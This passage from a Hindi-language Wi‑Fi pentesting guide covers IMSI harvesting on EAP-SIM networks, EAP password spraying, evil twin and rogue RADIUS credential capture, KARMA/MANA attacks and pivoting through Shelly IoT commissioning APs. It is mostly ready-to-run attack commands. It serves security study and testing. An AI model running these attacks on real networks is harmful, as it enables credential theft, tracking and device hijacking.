चाहे कोई भी प्रोटोकॉल चुना जाए, PEAP/TTLS server TLS tunnel स्थापित होने के बाद उपयोगकर्ता की वास्तविक identity का ज्ञान प्राप्त कर लेता है। वास्तविक identity user@realm या केवल user के रूप में हो सकती है। यदि PEAP/TTLS server उपयोगकर्ता को authenticate करने का भी जिम्मेदार है, तो अब उसके पास उपयोगकर्ता की identity होती है और वह TLS tunnel द्वारा सुरक्षित authentication method के साथ आगे बढ़ता है। वैकल्पिक रूप से, PEAP/TTLS server उपयोगकर्ता के home RADIUS server को एक नया RADIUS request फ़ॉरवर्ड कर सकता है। यह नया RADIUS request PEAP या TTLS protocol layer को छोड़ देता है। जहाँ protected authentication method EAP है, inner EAP messages home RADIUS server को बिना EAP-PEAP या EAP-TTLS wrapper के भेजे जाते हैं। outgoing RADIUS message के User-Name attribute में incoming RADIUS request के anonymous User-Name की जगह उपयोगकर्ता की वास्तविक identity होती है। जब protected authentication method PAP या CHAP है (जो केवल TTLS द्वारा समर्थित है), तो TLS payload से निकाले गए User-Name और अन्य authentication attributes outgoing RADIUS message में अस्थापित कर दिए जाते हैं, जो incoming RADIUS request में पाए गए anonymous User-Name और TTLS EAP-Message attributes की जगह लेते हैं।

For more info check [https://www.interlinknetworks.com/app_notes/eap-peap.htm](https://www.interlinknetworks.com/app_notes/eap-peap.htm)

### SIM-based EAP (EAP-SIM/EAP-AKA) identity leakage (IMSI exposure)

SIM-based Wi‑Fi authentication using EAP‑SIM/EAP‑AKA over 802.1X can leak the permanent subscriber identifier (IMSI) in cleartext during the unauthenticated identity phase if the deployment doesn’t implement pseudonyms/protected identities or a TLS tunnel around the inner EAP.

Where the leak happens (high level):
- 802.11 association completes to the SSID (often carrier offload SSIDs like FreeWifi_secure, eduroam-like operator realms, etc.).
- Authenticator sends EAP-Request/Identity.
- Vulnerable clients answer EAP-Response/Identity with their permanent identity = IMSI encoded as a 3GPP NAI, prior to any protection.
- Example NAI: 20815XXXXXXXXXX@wlan.mnc015.mcc208.3gppnetwork.org
- Anyone passively listening to RF can read that frame. No 4-way handshake or TLS keying is needed.

Quick PoC: passive IMSI harvesting on EAP‑SIM/AKA networks lacking identity privacy
<details>
<summary>Click to expand</summary>
```bash
# 1) Enable monitor mode
airmon-ng start wlan0

# 2) Optional: lock channel to the target BSS
airodump-ng wlan0mon --essid <SSID>

# 3) Capture 802.1X/EAP frames
# Wireshark display filters:
#   eap || eapol
#   (identity specifically): eap.code == 2 && eap.type == 1
# Kismet: add source wlan0mon; enable 802.1X/EAP views
# tcpdump (pcap capture):
#   tcpdump -i wlan0mon -s 0 -w eapsim_identity.pcap

# 4) Wait for a device to auto-connect to the SSID
# 5) Inspect the first EAP-Response/Identity frame
# Expected: ASCII NAI containing IMSI, e.g.
#   20815XXXXXXXXXX@wlan.mnc015.mcc208.3gppnetwork.org
```
</details>

नोट्स:
- यदि तैनाती bare EAP‑SIM/AKA का उपयोग करती है और protected identity/pseudonyms नहीं हैं, तो यह किसी भी TLS टनल से पहले काम करता है।
- प्रकट हुआ मान subscriber के SIM से जुड़ा एक स्थायी पहचानकर्ता है; इसे इकट्ठा करने से दीर्घकालिक ट्रैकिंग और बाद के चरणों में टेलीकॉम दुरुपयोग संभव हो जाते हैं।

प्रभाव
- गोपनीयता: सार्वजनिक स्थानों में passive Wi‑Fi कैप्चर्स से स्थायी यूज़र/डिवाइस ट्रैकिंग।
- टेलीकॉम दुरुपयोग बूटस्ट्रैप: IMSI के साथ, SS7/Diameter पहुँच वाला attacker स्थान पूछताछ कर सकता है या कॉल/SMS इंटरसेप्शन और MFA चोरी का प्रयास कर सकता है।

निवारण / किन बातों पर ध्यान दें
- सुनिश्चित करें कि क्लाइंट्स EAP‑SIM/AKA के लिए anonymous outer identities (pseudonyms) का उपयोग कर रहे हैं जैसा कि 3GPP guidance में कहा गया है (उदा., 3GPP TS 33.402)।
- पहचान चरण को टनल करना प्राथमिकता दें (उदा., EAP‑TTLS/PEAP जो inner EAP‑SIM/AKA को carry करता है) ताकि IMSI कभी प्लेन‑टेक्स्ट में न भेजा जाए।
- association/auth के packet captures कभी भी EAP-Response/Identity में raw IMSI को प्रकट नहीं करना चाहिए।

Related: Telecom signalling exploitation with captured mobile identifiers
{{#ref}}
../pentesting-network/telecom-network-exploitation.md
{{#endref}}

### EAP-Bruteforce (password spray)

यदि client से अपेक्षा की जाती है कि वह **username and password** का उपयोग करेगा (ध्यान दें कि इस मामले में **EAP-TLS मान्य नहीं होगा**), तो आप **usernames की एक सूची** (अगले भाग को देखें) और **passwords** प्राप्त करने की कोशिश कर सकते हैं और access के लिए [**air-hammer**](https://github.com/Wh1t3Rh1n0/air-hammer)**.** पर **bruteforce** आज़माने का प्रयास कर सकते हैं।
```bash
./air-hammer.py -i wlan0 -e Test-Network -P UserPassword1 -u usernames.txt
```
आप यह attack `eaphammer` का उपयोग करके भी कर सकते हैं:
```bash
./eaphammer --eap-spray \
--interface-pool wlan0 wlan1 wlan2 wlan3 wlan4 \
--essid example-wifi \
--password bananas \
--user-list users.txt
```
## क्लाइंट अटैक्स सिद्धांत

### नेटवर्क चयन और Roaming

- 802.11 प्रोटोकॉल यह परिभाषित करता है कि एक station किस तरह एक Extended Service Set (ESS) में जुड़ता है, पर यह यह निर्धारित नहीं करता कि किसी ESS या उसके भीतर किसी access point (AP) के चयन के मानदंड क्या होंगे।
- Stations समान ESSID साझा करने वाले APs के बीच roam कर सकते हैं, जिससे किसी इमारत या क्षेत्र में कनेक्टिविटी बनी रहती है।
- प्रोटोकॉल station द्वारा ESS को authenticate करने की आवश्यकता रखता है पर AP द्वारा station को authenticate करने का निर्देश नहीं देता।

### Preferred Network Lists (PNLs)

- Stations अपने Preferred Network List (PNL) में हर उस wireless नेटवर्क का ESSID स्टोर करते हैं जिससे वे कनेक्ट होते हैं, साथ ही नेटवर्क-विशेष configuration विवरण भी।
- PNL का उपयोग ज्ञात नेटवर्कों से स्वतः कनेक्ट करने के लिए किया जाता है, जिससे उपयोगकर्ता का कनेक्शन अनुभव सहज बनता है।

### Passive Scanning

- APs समय-समय पर beacon frames broadcast करते हैं, अपनी उपस्थिति और फीचर्स की घोषणा करते हुए, AP का ESSID शामिल करते हुए जब तक broadcasting अक्षम न हो।
- Passive scanning के दौरान stations beacon frames सुनते हैं। यदि किसी beacon का ESSID station की PNL में किसी प्रविष्टि से मेल खाता है, तो station स्वचालित रूप से उस AP से कनेक्ट हो सकता है।
- किसी डिवाइस की PNL का ज्ञान ज्ञात नेटवर्क के ESSID की नकल करके संभावित शोषण की अनुमति देता है, जिससे डिवाइस को एक rogue AP से कनेक्ट होने के लिए मूर्ख बनाया जा सकता है।

### Active Probing

- Active probing में stations probe requests भेजते हैं ताकि पास के APs और उनकी विशेषताओं का पता चल सके।
- Directed probe requests किसी विशिष्ट ESSID को लक्षित करते हैं, जो यह पता लगाने में मदद करते हैं कि कोई विशेष नेटवर्क रेंज में है या नहीं, भले ही वह hidden network ही क्यों न हो।
- Broadcast probe requests में null SSID field होता है और इन्हें सभी पास के APs को भेजा जाता है, जिससे station बिना अपनी PNL की सामग्री उजागर किए किसी भी preferred network की जांच कर सकता है।

## Simple AP with redirection to Internet

Before explaining how to perform more complex attacks it's going to be explained **how** to just **create** an **AP** and **redirect** it's **traffic** to an interface connected **to** the **Internet**.

Using `ifconfig -a` check that the wlan interface to create the AP and the interface connected to the Internet are present.

### DHCP & DNS
```bash
apt-get install dnsmasq #Manages DHCP and DNS
```
कॉन्फ़िग फ़ाइल बनाएं `/etc/dnsmasq.conf`:
```ini
interface=wlan0
dhcp-authoritative
dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
```
फिर **set IPs** और **routes**:
```bash
ifconfig wlan0 up 192.168.1.1 netmask 255.255.255.0
route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
```
और फिर **शुरू करें** dnsmasq:
```bash
dnsmasq -C dnsmasq.conf -d
```
### hostapd
```bash
apt-get install hostapd
```
एक config फ़ाइल बनाएँ `hostapd.conf`:
```ini
interface=wlan0
driver=nl80211
ssid=MITIWIFI
hw_mode=g
channel=11
macaddr_acl=0
ignore_broadcast_ssid=0
auth_algs=1
wpa=2
wpa_passphrase=mitmwifi123
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
wpa_group_rekey=86400
ieee80211n=1
wme_enabled=1
```
**परेशान करने वाली प्रक्रियाओं को रोकें** , सेट करें **monitor mode**, और **hostapd शुरू करें**:
```bash
airmon-ng check kill
iwconfig wlan0 mode monitor
ifconfig wlan0 up
hostapd ./hostapd.conf
```
### अग्रेषण और पुनर्निर्देशन
```bash
iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
iptables --append FORWARD --in-interface wlan0 -j ACCEPT
echo 1 > /proc/sys/net/ipv4/ip_forward
```
## Evil Twin

An evil twin attack उन तरीकों का फायदा उठाता है जिससे WiFi clients नेटवर्क को पहचानते हैं, जो मुख्य रूप से नेटवर्क नाम (ESSID) पर निर्भर करता है और base station (access point) को client के लिए authenticate करने की आवश्यकता नहीं होती। प्रमुख बिंदु:

- **भेद करने में कठिनाई**: Devices एक ही ESSID और encryption type साझा करने वाले legitimate और rogue access points के बीच अंतर करना मुश्किल पाते हैं। वास्तविक नेटवर्क अक्सर coverage बढ़ाने के लिए एक ही ESSID वाले multiple access points का उपयोग करते हैं।
- **Client Roaming and Connection Manipulation**: 802.11 protocol devices को उसी ESS के भीतर access points के बीच roam करने की अनुमति देता है। Attackers इसका लाभ उठा सकते हैं, एक device को उसके current base station से disconnect करवा कर rogue base station से connect करवाने के लिए। यह या तो stronger signal देकर या legitimate access point के कनेक्शन को deauthentication packets या jamming जैसे तरीकों से बाधित करके किया जा सकता है।
- **Execution में चुनौतियाँ**: multiple, well-placed access points वाले वातावरण में सफलतापूर्वक evil twin attack करना challenging हो सकता है। किसी एक legitimate access point को deauthenticate करने पर अक्सर device किसी दूसरे legitimate access point से connect कर लेता है, जब तक कि attacker सभी nearby access points को deauthenticate न कर सके या रणनीतिक रूप से rogue access point को place न करे।

You can create a very basic Open Evil Twin (no capabilities to route traffic to Internet) doing:
```bash
airbase-ng -a 00:09:5B:6F:64:1E --essid "Elroy" -c 1 wlan0mon
```
आप **eaphammer** का उपयोग करके एक Evil Twin भी बना सकते हैं (ध्यान दें कि eaphammer के साथ evil twins बनाने के लिए इंटरफ़ेस **should NOT be** in **monitor** mode):
```bash
./eaphammer -i wlan0 --essid exampleCorp --captive-portal
```
या Airgeddon का उपयोग करते हुए: `Options: 5,6,7,8,9 (inside Evil Twin attack menu).`

![](<../../images/image (1088).png>)

कृपया ध्यान दें कि डिफ़ॉल्ट रूप से यदि PNL में कोई ESSID WPA protected के रूप में सेव है, तो डिवाइस स्वतः ही किसी Open Evil Twin से कनेक्ट नहीं करेगा। आप असली AP पर DoS करके उम्मीद कर सकते हैं कि उपयोगकर्ता मैन्युअली आपके Open evil twin से कनेक्ट कर देगा, या आप असली AP पर DoS कर के एक WPA Evil Twin का उपयोग करके handshake को capture कर सकते हैं (इस तरीके से आप पीड़ित को अपने साथ कनेक्ट करने की इजाज़त नहीं दे पाएंगे क्योंकि आपको PSK पता नहीं होगा, लेकिन आप handshake कैप्चर कर सकते हैं और इसे crack करने की कोशिश कर सकते हैं)।

_कुछ OS और AV उपयोगकर्ता को चेतावनी देंगे कि Open network से कनेक्ट करना खतरनाक है..._

### WPA/WPA2 Evil Twin

आप **Evil Twin using WPA/2** बना सकते हैं और यदि डिवाइस उस SSID को WPA/2 के साथ कनेक्ट करने के लिए कॉन्फ़िगर हैं, तो वे कनेक्ट करने की कोशिश करेंगे। हालाँकि, **4-way-handshake को पूरा करने के लिए** आपको क्लाइंट द्वारा उपयोग किए जाने वाले **password** को जानना होगा। यदि आप इसे **नहीं जानते**, तो **कनेक्शन पूरा नहीं होगा**।
```bash
./eaphammer -i wlan0 -e exampleCorp -c 11 --creds --auth wpa-psk --wpa-passphrase "mywifipassword"
```
### Enterprise Evil Twin

इन आक्रमणों को समझने के लिए मैं सुझाव दूँगा कि पहले संक्षेप में [WPA Enterprise explanation](#wpa-enterprise-mgt) पढ़ लें।

**hostapd-wpe का उपयोग**

`hostapd-wpe` को काम करने के लिए एक **configuration** फ़ाइल की आवश्यकता होती है। इन कॉन्फ़िगरेशनों के निर्माण को **स्वचालित** करने के लिए आप [https://github.com/WJDigby/apd_launchpad](https://github.com/WJDigby/apd_launchpad) का उपयोग कर सकते हैं (python फ़ाइल को _/etc/hostapd-wpe/_ के अंदर डाउनलोड करें)।
```bash
./apd_launchpad.py -t victim -s PrivateSSID -i wlan0 -cn company.com
hostapd-wpe ./victim/victim.conf -s
```
कॉन्फ़िगरेशन फ़ाइल में आप ssid, channel, user files, cret/key, dh parameters, wpa version और auth जैसी कई अलग-अलग चीज़ें चुन सकते हैं...

[**Using hostapd-wpe with EAP-TLS to allow any certificate to login.**](evil-twin-eap-tls.md)

**Using EAPHammer**
```bash
# Generate Certificates
./eaphammer --cert-wizard

# Launch Attack
./eaphammer -i wlan0 --channel 4 --auth wpa-eap --essid CorpWifi --creds
```
डिफ़ॉल्ट रूप से, EAPHammer इन authentication methods का उपयोग करता है (नोट करें GTC को सबसे पहले plaintext passwords प्राप्त करने के लिए आज़माया जाता है और फिर अधिक robust auth methods का उपयोग किया जाता है):
```
GTC,MSCHAPV2,TTLS-MSCHAPV2,TTLS,TTLS-CHAP,TTLS-PAP,TTLS-MSCHAP,MD5
```
यह लंबे कनेक्शन समय से बचने के लिए डिफ़ॉल्ट मेथडोलॉजी है। हालाँकि, आप server के लिए authentication methods को weakest से strongest के क्रम में specify भी कर सकते हैं:
```
--negotiate weakest
```
Or you could also use:

- `--negotiate gtc-downgrade` to use highly efficient GTC downgrade implementation (plaintext passwords)
- `--negotiate manual --phase-1-methods PEAP,TTLS --phase-2-methods MSCHAPV2,GTC,TTLS-PAP` to specify manually the methods offered (उसी संगठन द्वारा उपयोग किए गए समान auth methods को उसी क्रम में ऑफर करने से हमला पकड़ना बहुत अधिक कठिन हो जाएगा).
- [Find more info in the wiki](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)

#### जब क्लाइंट RADIUS प्रमाणपत्र सत्यापन छोड़ते हैं (PEAP/TTLS)

- If devices are configured with "do not validate certificate", a cloned AP + rogue RADIUS (`eaphammer --cert-wizard --creds --auth wpa-eap`) will collect **NetNTLMv2** (PEAP-MSCHAPv2) or **cleartext** creds (PEAP-GTC). `bettercap` deauth (`wifi.deauth <BSSID>`) both reveals hidden SSIDs during probes and forces reconnects, unless PMF/802.11w blocks spoofed deauth.
- Cracked NetNTLMv2 gives reusable Wi‑Fi/AD creds; GTC yields immediate plaintext.

#### Relaying PEAP-MSCHAPv2 instead of cracking (wpa_sycophant + hostapd-mana)

- मशीन खातों के लिए जिनके पास अनक्रैकबल रैंडम पासवर्ड हैं, **MSCHAPv2 relay** का दुरुपयोग करें: `hostapd-mana` को Evil Twin के रूप में चलाएँ, MSCHAPv2 एक्सचेंज को `wpa_sycophant` पर फ़ॉरवर्ड करते हुए, जो समानांतर में वैध AP से कनेक्ट होता है। सफल रिले पासवर्ड recovery किए बिना authenticated Wi‑Fi प्रदान करता है.
- उन बिल्ड्स का उपयोग करें जो target security level का समर्थन करते हैं (WPA3/PMF requires recent hostapd/wpa_supplicant); PMF deauth coercion को रोकता है, इसलिए voluntary client associations का इंतजार करें।

**Airgeddon का उपयोग**

`Airgeddon` पहले से जनरेट किए गए certificated का उपयोग कर सकता है ताकि WPA/WPA2-Enterprise नेटवर्क्स को EAP authentication ऑफर किया जा सके. The fake network will downgrade the connection protocol to EAP-MD5 so it will be able to **capture the user and the MD5 of the password**. बाद में, attacker पासवर्ड क्रैक करने की कोशिश कर सकता है.\
`Airggedon` आपको **continuous Evil Twin attack (noisy)** या **केवल तब तक Evil Attack बनाकर रखना जब तक कोई कनेक्ट न हो (smooth)** का विकल्प देता है.

![](<../../images/image (936).png>)

### Evil Twins attacks में PEAP और EAP-TTLS TLS टनल्स को डिबग करना

_यह method PEAP कनेक्शन में टेस्ट किया गया था लेकिन क्योंकि मैं एक arbitrary TLS tunnel को decrypt कर रहा हूँ, यह EAP-TTLS के साथ भी काम करना चाहिए_

Inside the **configuration** of _hostapd-wpe_ **comment** the line that contains _**dh_file**_ (from `dh_file=/etc/hostapd-wpe/certs/dh` to `#dh_file=/etc/hostapd-wpe/certs/dh`)\
यह `hostapd-wpe` को DH के बजाय **RSA का उपयोग करके कुंजियाँ एक्सचेंज** करने पर मजबूर कर देगा, इसलिए आप बाद में सर्वर की private key जानते हुए ट्रैफ़िक को **decrypt** कर पाएंगे।

अब उस बदली हुई configuration के साथ सामान्य तरीके से **Evil Twin** को **`hostapd-wpe`** का उपयोग करके स्टार्ट करें। साथ ही, उस **interface** में **`wireshark`** शुरू करें जो Evil Twin attack कर रहा है।

अब या बाद में (जब आप पहले से कुछ authentication intents capture कर चुके हों) आप private RSA key को wireshark में जोड़ सकते हैं: `Edit --> Preferences --> Protocols --> TLS --> (RSA keys list) Edit...`

एक नया entry जोड़ें और इस फॉर्म को इन मानों से भरें: **IP address = any** -- **Port = 0** -- **Protocol = data** -- **Key File** (**अपनी key file चुनें**, समस्याओं से बचने के लिए एक ऐसी key file चुनें **जो password protected न हो**).

![](<../../images/image (687).png>)

And look at the new **"Decrypted TLS" tab**:

![](<../../images/image (231).png>)

## KARMA, MANA, Loud MANA and Known beacons attack

### ESSID और MAC ब्लैक/व्हाइटलिस्ट्स

Media Access Control Filter Lists (MFACLs) के विभिन्न प्रकार और rogue Access Point (AP) के व्यवहार पर उनके संबंधित मोड और प्रभाव:

1. **MAC-based Whitelist**:
- Rogue AP केवल उन डिवाइसों के probe requests का जवाब देगा जो whitelist में निर्दिष्ट हैं, और सूचीबद्ध नहीं होने वालों के लिए अदृश्य रहेगा।
2. **MAC-based Blacklist**:
- Rogue AP blacklist पर मौजूद डिवाइसेज़ के probe requests को ignore करेगा, जिससे rogue AP उन विशेष डिवाइसेज़ के लिए effectively invisible हो जाएगा।
3. **SSID-based Whitelist**:
- Rogue AP केवल सूचीबद्ध specific ESSIDs के लिए probe requests का जवाब देगा, जिससे यह उन डिवाइसों के लिए invisible हो जाएगा जिनकी Preferred Network Lists (PNLs) में वे ESSIDs नहीं हैं।
4. **SSID-based Blacklist**:
- Rogue AP blacklist में मौजूद specific ESSIDs के probe requests का जवाब नहीं देगा, जिससे यह उन नेटवर्कों की तलाश करने वाले डिवाइसों के लिए invisible हो जाएगा।
```bash
# example EAPHammer MFACL file, wildcards can be used
09:6a:06:c8:36:af
37:ab:46:7a:9a:7c
c7:36:8c:b2:*:*

[--mac-whitelist /path/to/mac/whitelist/file.txt #EAPHammer whitelisting]
[--mac-blacklist /path/to/mac/blacklist/file.txt #EAPHammer blacklisting]
```

```bash
# example ESSID-based MFACL file
name1
name2
name3

[--ssid-whitelist /path/to/mac/whitelist/file.txt]
[--ssid-blacklist /path/to/mac/blacklist/file.txt]
```
### KARMA

यह तरीका एक **attacker को malicious access point (AP) बनाने की अनुमति देता है जो नेटवर्क से कनेक्ट करने की कोशिश कर रहे devices की सभी probe requests का जवाब देता है**। यह technique devices को attacker के AP से कनेक्ट होने के लिए trick करता है क्योंकि यह उन नेटवर्कों की नक़ल करता है जिन्हें devices खोज रहे होते हैं। जब कोई device इस rogue AP को कनेक्शन अनुरोध भेजता है, तो कनेक्शन पूरा हो जाता है, जिससे device गलती से attacker के नेटवर्क से जुड़ जाता है।

### MANA

फिर, **devices ने unsolid network responses को नज़रअंदाज़ करना शुरू कर दिया**, जिससे original karma attack की प्रभावशीलता कम हो गई। हालांकि, Ian de Villiers और Dominic White द्वारा एक नया तरीका पेश किया गया जिसे **MANA attack** कहा जाता है। यह तरीका rogue AP को devices की **Preferred Network Lists (PNL) को उनके broadcast probe requests का जवाब देकर capture करने** में सक्षम बनाता है, उन network names (SSIDs) के साथ जो पहले devices द्वारा solid किए गए थे। यह परिष्कृत attack original karma attack के खिलाफ मौजूद सुरक्षा उपायों को बाइपास करता है क्योंकि यह उस तरीके का फायदा उठाता है जिससे devices ज्ञात नेटवर्कों को याद रखते और प्राथमिकता देते हैं।

MANA attack दोनों directed और broadcast probe requests को monitor करके काम करता है। directed requests के लिए, यह device का MAC address और requested network name रिकॉर्ड करता है और इस जानकारी को एक सूची में जोड़ देता है। जब एक broadcast request प्राप्त होती है, तो AP ऐसी जानकारी के साथ जवाब देता है जो device की सूची में किसी भी नेटवर्क से मेल खाती है, और device को rogue AP से जुड़ने के लिए आकर्षित करती है।
```bash
./eaphammer -i wlan0 --cloaking full --mana --mac-whitelist whitelist.txt [--captive-portal] [--auth wpa-psk --creds]
```
### Loud MANA

A **Loud MANA attack** एक उन्नत रणनीति है उन स्थितियों के लिए जब डिवाइस directed probing का उपयोग नहीं करते या जब उनके Preferred Network Lists (PNL) हमलावर के लिए अज्ञात होते हैं। यह इस सिद्धांत पर काम करता है कि **एक ही क्षेत्र में मौजूद डिवाइस संभवतः अपने PNLs में कुछ समान नेटवर्क नाम साझा करते हैं**। चयनात्मक रूप से प्रतिक्रिया देने की बजाय, यह attack उन सभी देखे गए डिवाइसों के संयुक्त PNLs में पाए गए हर नेटवर्क नाम (ESSID) के लिए probe responses प्रसारित करता है। यह व्यापक तरीका किसी डिवाइस के परिचित नेटवर्क को पहचानने और rogue Access Point (AP) से जुड़ने का प्रयास करने की संभावना बढ़ा देता है।
```bash
./eaphammer -i wlan0 --cloaking full --mana --loud [--captive-portal] [--auth wpa-psk --creds]
```
### Known Beacon attack

जब **Loud MANA attack** पर्याप्त नहीं होता, तो **Known Beacon attack** एक अलग तरीका पेश करता है। यह विधि **brute-forces the connection process by simulating an AP that responds to any network name, cycling through a list of potential ESSIDs** — ये संभावित ESSIDs एक wordlist से ली जाती हैं। यह कई नेटवर्कों की उपस्थिति का अनुकरण करता है, यह उम्मीद करते हुए कि कोई ESSID victim's PNL में मिल जाए, जिससे डिवाइस नकली AP से कनेक्ट करने का प्रयास करेगा। इस आक्रमण को `--loud` विकल्प के साथ मिलाकर और भी आक्रामक बनाया जा सकता है ताकि devices को फंसाने की कोशिश अधिक प्रभावी हो।

Eaphammer ने इस आक्रमण को एक MANA attack के रूप में लागू किया है, जहाँ सूची के अंदर सभी ESSIDs प्रसारित किए जाते हैं (आप इसे `--loud` के साथ जोड़कर Loud MANA + Known beacons attack भी बना सकते हैं):
```bash
./eaphammer -i wlan0 --mana [--loud] --known-beacons  --known-ssids-file wordlist.txt [--captive-portal] [--auth wpa-psk --creds]
```
**Known Beacon Burst attack**

**Known Beacon Burst attack** में **फ़ाइल में सूचीबद्ध प्रत्येक ESSID के लिए beacon frames का तीव्र प्रसारण** शामिल है। यह नकली नेटवर्कों का एक घना वातावरण बनाता है, जिससे डिवाइसों द्वारा rogue AP से कनेक्ट होने की संभावना काफी बढ़ जाती है, खासकर जब इसे MANA attack के साथ जोड़ा जाता है। यह तकनीक डिवाइसों के नेटवर्क चयन तंत्रों को दबाने के लिए गति और मात्रा का उपयोग करती है।
```bash
# transmit a burst of 5 forged beacon packets for each entry in list
./forge-beacons -i wlan1 \
--bssid de:ad:be:ef:13:37 \
--known-essids-file known-s.txt \
--dst-addr 11:22:33:11:22:33 \
--burst-count 5
```
## Wi-Fi Direct

**Wi-Fi Direct** एक प्रोटोकॉल है जो डिवाइसों को पारंपरिक wireless access point की आवश्यकता के बिना Wi‑Fi के माध्यम से सीधे आपस में जुड़ने में सक्षम बनाता है। यह क्षमता कई Internet of Things (IoT) डिवाइसों में एकीकृत होती है, जैसे printers और televisions, जिससे device-to-device डायरेक्ट कम्युनिकेशन संभव होता है। एक महत्वपूर्ण विशेषता यह है कि Wi‑Fi Direct में एक डिवाइस access point की भूमिका निभाता है, जिसे connection प्रबंधित करने के लिए group owner कहा जाता है।

Security for Wi-Fi Direct connections Wi‑Fi Protected Setup (WPS) के माध्यम से स्थापित होती है, जो secure pairing के लिए कई तरीकों का समर्थन करती है, जिनमें शामिल हैं:

- **Push-Button Configuration (PBC)**
- **PIN entry**
- **Near-Field Communication (NFC)**

ये तरीके, विशेषकर PIN entry, पारंपरिक Wi‑Fi नेटवर्क्स में WPS जैसी ही कमजोरियों के प्रति संवेदनशील होते हैं, और इसलिए समान attack vectors के लिए लक्ष्य बनते हैं।

### EvilDirect Hijacking

**EvilDirect Hijacking** Wi‑Fi Direct के लिए विशिष्ट एक attack है। यह Evil Twin attack की अवधारणा का अनुवर्ती है लेकिन Wi‑Fi Direct connections को लक्षित करता है। इस परिदृश्य में, एक attacker वैध group owner की नकल करता है ताकि devices को एक malicious entity से जुड़ने के लिए धोखा दिया जा सके। इस विधि को `airbase-ng` जैसे tools का उपयोग करके execute किया जा सकता है, जिसमें impersonated device के channel, ESSID, और MAC address निर्दिष्ट किए जाते हैं:

## Commissioning AP persistence & dual-homed IoT pivoting (Shelly Gen4 case)

कुछ consumer IoT relays/controllers provisioning के बाद commissioning **open AP** को सक्रिय रखते हैं जब तक वे IoT WLAN में जुड़ते हैं (उदाहरण के लिए, Shelly Gen4 SSIDs जो `Shelly` से शुरू होते हैं)। डिवाइस **dual-homed** बना रहता है: एक AP interface जिसका default IP `192.168.33.1` है और साथ ही internal WLAN पर एक client interface।

**Abuse flow (Wi‑Fi proximity required):**

1. Provisioning AP में जुड़ें, DHCP lease प्राप्त करें, और **AP-side HTTP API** को ब्राउज़ करें।
2. Unauthenticated endpoints के माध्यम से relays को trigger करें, उदाहरण: `http://192.168.33.1/relay/0?turn=on` (दरवाज़ा/गेट/garage को प्रभावित कर सकता है)। Firmware upload endpoints persistence जोड़ सकते हैं।
3. इसे एक **pivot** के रूप में उपयोग करें: Shelly scripting internal interface से अन्य LAN hosts पर HTTP भेज सकती है। किसी अन्य Shelly (`10.0.98.221`) पर pivot का उदाहरण:
```javascript
Shelly.addEventHandler(function (event) {
if (event.component === "switch:0" && event.info.state) {
Shelly.call("HTTP.GET", { url: "http://10.0.98.221/light/0?turn=on" });
}
});
```
URL को किसी भी reachable internal HTTP target के लिए बदलें; dual-homing अतिरिक्त routing/NAT काम से बचाता है।
4. बड़े पैमाने पर: vendor SSIDs को **wigle.net** पर query करें (उदा., `Shelly`) ताकि on-site exploitation के लिए commissioning APs का पता लगाया जा सके।

Persistence के लिए, commissioning AP को enabled ही छोड़ दें।

## References

- [https://www.pentestpartners.com/security-blog/shelly-iot-door-controller-config-fail-leaving-your-garage-home-and-security-exposed/](https://www.pentestpartners.com/security-blog/shelly-iot-door-controller-config-fail-leaving-your-garage-home-and-security-exposed/)
- [https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee](https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee)
- [https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9](https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9)
- [https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38](https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38)
- [https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d](https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d)
- [https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf](https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf)
- [http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)
- [https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)
- [https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d](https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d)
- [https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)](<https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)>)
- [https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)
- [The vulnerability that killed FreeWifi_Secure](https://7h30th3r0n3.fr/the-vulnerability-that-killed-freewifi_secure/)
- [RFC 4186 – EAP-SIM Authentication](https://datatracker.ietf.org/doc/html/rfc4186)
- [3GPP TS 33.402 – 3GPP system architecture evolution (SAE); Security aspects of non-3GPP accesses](https://www.3gpp.org/ftp/Specs/archive/33_series/33.402/)
- [Wireless-(in)Fidelity: Pentesting Wi-Fi in 2025 (Synacktiv)](https://www.synacktiv.com/en/publications/wireless-infidelity-pentesting-wi-fi-in-2025.html)
